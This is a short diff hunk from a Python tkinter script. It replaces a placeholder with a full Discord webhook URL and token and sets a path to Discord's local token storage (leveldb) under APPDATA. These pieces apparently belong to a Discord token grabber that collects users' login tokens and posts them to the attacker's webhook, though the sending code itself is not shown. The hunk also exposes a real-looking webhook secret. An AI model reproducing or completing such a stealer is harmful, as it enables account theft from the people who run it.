@@ -9,7 +9,7 @@ from tkinter import Label
 window = tkinter.Tk()
 ########################################################
 #           PASTE THE WEBHOOKLINK HERE!
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/841846699609686026/Dz1kLHm3ptsDKjnBme1GH8JMxUmJgMGjGf4YJiaEbBdUiRwGX2ovNth8N8J1kXszGkNY'
 #           PASTE THE WEBHOOKLINK HERE!
 ########################################################
 discdir = os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb'
